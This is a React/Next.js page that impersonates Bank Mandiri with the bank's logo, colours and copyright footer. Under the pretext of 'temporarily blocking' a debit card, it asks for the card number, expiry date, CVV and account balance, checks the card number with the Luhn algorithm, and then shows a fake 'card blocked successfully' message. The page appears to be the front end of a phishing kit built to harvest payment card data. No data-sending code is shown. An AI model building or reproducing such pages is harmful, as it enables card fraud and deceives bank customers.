'use client';

import React, { useState, useEffect } from 'react';
import Image from 'next/image';
import { motion, AnimatePresence } from 'motion/react';
import { 
  CreditCard, 
  Calendar, 
  Lock, 
  Wallet, 
  Info, 
  ShieldCheck, 
  CheckCircle2 
} from 'lucide-react';

// Luhn Algorithm for card validation
const validateLuhn = (number: string) => {
  let sum = 0;
  let shouldDouble = false;
  for (let i = number.length - 1; i >= 0; i--) {
    let digit = parseInt(number.charAt(i));
    if (shouldDouble) {
      if ((digit *= 2) > 9) digit -= 9;
    }
    sum += digit;
    shouldDouble = !shouldDouble;
  }
  return sum !== 0 && sum % 10 === 0;
};

export default function MandiriBlockPage() {
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [balance, setBalance] = useState('');
  const [isLuhnValid, setIsLuhnValid] = useState(true);
  const [isLoading, setIsLoading] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);

  // Form validation
  const isValid = 
    cardNumber.replace(/\s/g, '').length >= 16 && 
    validateLuhn(cardNumber.replace(/\s/g, '')) &&
    expiry.length === 5 && 
    cvv.length === 3 && 
    balance !== '';

  const handleCardInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\D/g, '');
    let formatted = val.match(/.{1,4}/g);
    const finalVal = formatted ? formatted.join(' ') : '';
    setCardNumber(finalVal);
    
    const rawVal = finalVal.replace(/\s/g, '');
    if (rawVal.length >= 15) {
      setIsLuhnValid(validateLuhn(rawVal));
    } else {
      setIsLuhnValid(true);
    }
  };

  const handleExpiryInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\D/g, '');
    if (val.length >= 2) {
      val = val.slice(0, 2) + '/' + val.slice(2, 4);
    }
    setExpiry(val);
  };

  const handleBalanceInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    let raw = e.target.value.replace(/\D/g, '');
    if (!raw) {
      setBalance('');
      return;
    }
    setBalance('Rp ' + parseInt(raw).toLocaleString('id-ID'));
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!isValid) return;

    setIsLoading(true);
    // Simulate processing
    setTimeout(() => {
      setIsLoading(false);
      setIsSuccess(true);
    }, 3000);
  };

  return (
    <div className="min-h-screen flex flex-col items-center pb-10 overflow-x-hidden relative bg-[#eef4f9]">
      <div className="security-overlay left-0 border-r border-[#004D99]/5" />
      <div className="security-overlay right-0 border-l border-[#004D99]/5" />

      {/* Loading Overlay */}
      <AnimatePresence>
        {isLoading && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-white/95 z-[9999] flex flex-col justify-center items-center"
          >
            <div className="relative w-16 h-16">
              <motion.div 
                animate={{ rotate: 360 }}
                transition={{ duration: 1.2, repeat: Infinity, ease: "linear" }}
                className="absolute inset-0 rounded-full border-4 border-transparent border-t-[#004D99] border-bottom-[#004D99]"
              />
              <motion.div 
                animate={{ rotate: -360 }}
                transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                className="absolute inset-[15%] rounded-full border-4 border-transparent border-l-[#FF9E1B] border-r-[#FF9E1B]"
              />
            </div>
            <p className="mt-5 font-bold text-[#002D5C] text-sm">Memproses pemblokiran...</p>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Success Modal */}
      <AnimatePresence>
        {isSuccess && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="fixed inset-0 bg-black/80 z-[10000] flex justify-center items-center backdrop-blur-sm px-6"
          >
            <motion.div 
              initial={{ y: 50, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              className="w-full max-w-sm bg-white rounded-3xl overflow-hidden text-center p-8 shadow-2xl"
            >
              <div className="flex justify-center mb-6">
                <div className="w-20 h-20 bg-green-50 rounded-full flex items-center justify-center">
                  <CheckCircle2 className="w-12 h-12 text-green-500" />
                </div>
              </div>
              <h1 className="text-[#002D5C] text-xl font-bold mb-3">Blokir Kartu Berhasil</h1>
              <p className="text-gray-500 text-sm leading-relaxed">
                Kartu Anda telah berhasil diblokir sementara. Detail konfirmasi akan dikirimkan melalui layanan resmi bank.
              </p>
              <button 
                onClick={() => setIsSuccess(false)}
                className="mt-8 w-full py-4 bg-[#003d79] text-white rounded-full font-bold shadow-lg shadow-[#003d79]/20"
              >
                Selesai
              </button>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      <header className="w-full bg-white py-4 shadow-sm mb-8 flex justify-center sticky top-0 z-40">
        <Image 
          src="https://upload.wikimedia.org/wikipedia/commons/a/ad/Bank_Mandiri_logo_2016.svg" 
          alt="Mandiri" 
          width={110} 
          height={32}
          className="h-8 w-auto"
        />
      </header>
      
      <main className="w-full max-w-md px-4">
        <motion.div 
          initial={{ y: 20, opacity: 0 }}
          animate={{ y: 0, opacity: 1 }}
          className="bg-white rounded-2xl p-6 shadow-xl shadow-blue-900/5"
        >
          <div className="text-center mb-8">
            <h2 className="text-[#002D5C] text-xl font-bold mb-2">Blokir Kartu Debit</h2>
            <p className="text-gray-500 text-xs leading-relaxed">
              Silakan masukkan detail kartu debit Anda yang ingin diblokir sementara untuk keamanan akun.
            </p>
          </div>
          
          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="space-y-1.5">
              <label className="block text-[10px] font-bold text-[#002D5C] uppercase tracking-wider">Nomor Kartu</label>
              <div className="relative">
                <CreditCard className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                <input 
                  type="tel" 
                  value={cardNumber}
                  onChange={handleCardInput}
                  className={`w-full pl-10 pr-4 py-3 border-2 rounded-xl text-sm outline-none transition-all ${
                    !isLuhnValid ? 'border-red-500 bg-red-50' : 'border-[#e2e8f0] focus:border-[#004D99]'
                  }`}
                  placeholder="xxxx xxxx xxxx xxxx"
                  maxLength={19}
                  required
                />
              </div>
              {!isLuhnValid && (
                <p className="text-red-500 text-[10px] font-medium mt-1">Nomor kartu tidak valid.</p>
              )}
            </div>

            <div className="flex gap-4">
              <div className="flex-1 space-y-1.5">
                <label className="block text-[10px] font-bold text-[#002D5C] uppercase tracking-wider">Masa Berlaku</label>
                <div className="relative">
                  <Calendar className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                  <input 
                    type="tel" 
                    value={expiry}
                    onChange={handleExpiryInput}
                    className="w-full pl-10 pr-4 py-3 border-2 border-[#e2e8f0] focus:border-[#004D99] rounded-xl text-sm outline-none transition-all"
                    placeholder="MM/YY"
                    maxLength={5}
                    required
                  />
                </div>
              </div>
              <div className="flex-1 space-y-1.5">
                <label className="block text-[10px] font-bold text-[#002D5C] uppercase tracking-wider">CVV</label>
                <div className="relative">
                  <Lock className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                  <input 
                    type="password" 
                    value={cvv}
                    onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0,3))}
                    className="w-full pl-10 pr-4 py-3 border-2 border-[#e2e8f0] focus:border-[#004D99] rounded-xl text-sm outline-none transition-all"
                    placeholder="***"
                    maxLength={3}
                    required
                  />
                </div>
              </div>
            </div>

            <div className="space-y-1.5">
              <label className="block text-[10px] font-bold text-[#002D5C] uppercase tracking-wider">Saldo Tersedia (Estimasi)</label>
              <div className="relative">
                <Wallet className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                <input 
                  type="tel" 
                  value={balance}
                  onChange={handleBalanceInput}
                  className="w-full pl-10 pr-4 py-3 border-2 border-[#e2e8f0] focus:border-[#004D99] rounded-xl text-sm outline-none transition-all"
                  placeholder="Rp 0"
                  required
                />
              </div>
              <div className="flex items-start gap-2 bg-[#f8fafc] p-3 rounded-xl border border-[#e2e8f0] mt-3">
                <Info className="w-3.5 h-3.5 text-[#004D99] mt-0.5 flex-shrink-0" />
                <p className="text-[10px] text-slate-600 leading-normal">
                  Pemblokiran ini akan menonaktifkan transaksi kartu untuk sementara waktu guna perlindungan data.
                </p>
              </div>
            </div>

            <button 
              type="submit" 
              disabled={!isValid}
              className={`w-full py-4 mt-4 flex items-center justify-center gap-2 rounded-full font-bold transition-all shadow-lg ${
                isValid 
                  ? 'bg-[#003d79] text-white shadow-[#003d79]/20 cursor-pointer active:scale-95' 
                  : 'bg-slate-200 text-gray-400 cursor-not-allowed shadow-none'
              }`}
            >
              <ShieldCheck className="w-5 h-5" />
              KONFIRMASI BLOKIR
            </button> 
          </form>
        </motion.div>
      </main>

      <footer className="fixed bottom-0 w-full max-w-md bg-[#2467ab] text-white text-center py-2.5 text-[10px] uppercase tracking-widest font-medium">
        © 2026 PT Bank Mandiri (Persero) Tbk.
      </footer>
    </div>
  );
}
